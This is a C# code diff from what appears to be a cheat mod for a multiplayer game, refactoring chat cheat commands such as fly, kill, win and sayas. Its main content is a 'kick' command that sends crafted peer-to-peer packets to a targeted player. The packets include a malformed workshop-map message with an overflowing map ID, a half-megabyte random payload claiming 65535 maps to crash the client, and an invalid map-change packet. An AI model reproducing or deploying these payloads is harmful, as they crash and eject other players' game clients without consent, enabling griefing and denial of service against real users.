@@ -141,16 +141,21 @@ public static class ChatCommands
         new Command("fastpunch", FastPunchCmd, 0, true).MarkAsToggle(),
         new Command("fly", FlyCmd, 0, true).MarkAsToggle(),
         new Command("gun", GunCmd, 0, true),
-        new Command("kick", KickCmd, 0, true, PlayerUtils.PlayerColorsParams),
+        new Command("kick", KickCmd, 0, true, (List<List<string>>)
+        [
+            PlayerUtils.PlayerColorsParams,
+            [ "Built-in", "Client_Init", "Workshop_Corruption_Kick", "Workshop_Crash", "Invalid_Map"]
+        ]),
         new Command("kill", KillCmd, 0, true, PlayerUtils.PlayerColorsParams),
         new Command("revive", ReviveCmd, 0, true),
         new Command("scrollattack", ScrollAttackCmd, 0, true).MarkAsToggle(),
         new Command("showhp", ShowHpCmd, 0, true).MarkAsToggle(),
-        new Command("sayas", SayAsCmd, 2, true, new List<List<string>>
-        {
+        new Command("sayas", SayAsCmd, 2, true, (List<List<string>>)
+        [
             PlayerUtils.PlayerColorsParams,
-            new List<string> { "visible", "invisible" }
-        }),        new Command("summon", SummonCmd, 1, true, new List<string>(3) { "player", "bolt", "zombie" }),
+            [ "visible", "invisible" ]
+        ]),
+        new Command("summon", SummonCmd, 1, true, new List<string>(3) { "player", "bolt", "zombie" }),
         new Command("switchweapon", SwitchWeaponCmd, 0, true).MarkAsToggle(),
         new Command("tp", TeleportCmd, 2, true),
         new Command("win", WinCmd, 0, true, PlayerUtils.PlayerColorsParams),
@@ -1588,8 +1593,7 @@ public static class ChatCommands
         CheatTextManager.ToggleFeature("HPBar", cmd.IsEnabled);
         foreach (var hpBar in Helper.HpBars)
         {
-            if (hpBar == null) continue;
-            hpBar.SetActive(cmd.IsEnabled);
+            hpBar?.SetActive(cmd.IsEnabled);
         }
         cmd.SetOutputMsg("Toggled HP Bar.");
     }
@@ -1733,10 +1737,10 @@ public static class ChatCommands
         if (args.Length < 1)
         {
             cmd.SetLogType(Command.LogType.Warning);
-            cmd.SetOutputMsg("0:Built-in 1:Client_Init 2:Workshop_Corruption_Kick 3:Workshop_Crash 4:Invalid_Map");
+            cmd.SetOutputMsg("Available methods: Built-in Client_Init Workshop_Corruption_Kick Workshop_Crash Invalid_Map");
             return;
         }
-        var method = args.Length > 1 ? args[1] : "0";
+        var method = args.Length > 1 ? args[1] : "Built-in";
         var targetID = Helper.GetIDFromColor(args[0]);
         var payload = new byte[] { 0x00 };
         P2PPackageHandler.MsgType msgType;
@@ -1748,30 +1752,31 @@ public static class ChatCommands
         }
         switch (method)
         {
-            case "0": // Built-in
+            case "Built-in":
                 msgType = P2PPackageHandler.MsgType.KickPlayer;
                 break;
-            case "1": // Client_Init
+            case "Client_Init":
                 msgType = P2PPackageHandler.MsgType.ClientInit;
                 break;
-            case "2": // Workshop_Corruption_Kick
+            case "Workshop_Corruption_Kick":
                 msgType = P2PPackageHandler.MsgType.WorkshopMapsLoaded;
                 payload = [0x01, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]; // mapCount[2] = 1, mapID[8] = 2^64 - 1
                 break;
-            case "3": // Workshop_Crash
+            case "Workshop_Crash":
                 msgType = P2PPackageHandler.MsgType.WorkshopMapsLoaded;
                 payload = new byte[524282 /* 0xFFFF * 8 + 2 */];
                 new System.Random().NextBytes(payload);
                 payload[0] = 0xFF;
                 payload[1] = 0xFF; // mapCount = 65535
                 break;
-            case "4": // Invalid_Map
+            case "Invalid_Map":
                 msgType = P2PPackageHandler.MsgType.MapChange;
-                payload = [(byte)targetID, 0, 103, 0, 0, 0]; // 0: Landfall, Map ID[4]: 103
+                //payload = [(byte)targetID, 0, 103, 0, 0, 0]; // 0: Landfall, Map ID[4]: 103
+                payload = [(byte)targetID, 0, 0, 0, 0, 0]; // 0: Landfall, Map ID[4]: 0
                 break;
             default:
                 cmd.SetLogType(Command.LogType.Warning);
-                cmd.SetOutputMsg("0:Built-in 1:Client_Init 2:Workshop_Corruption_Kick 3:Workshop_Crash 4:Invalid_Map");
+                cmd.SetOutputMsg("Available methods: Built-in Client_Init Workshop_Corruption_Kick Workshop_Crash Invalid_Map");
                 return;
         }
         Helper.SendP2PPacketToUser(Helper.GetSteamID(targetID), payload, msgType);
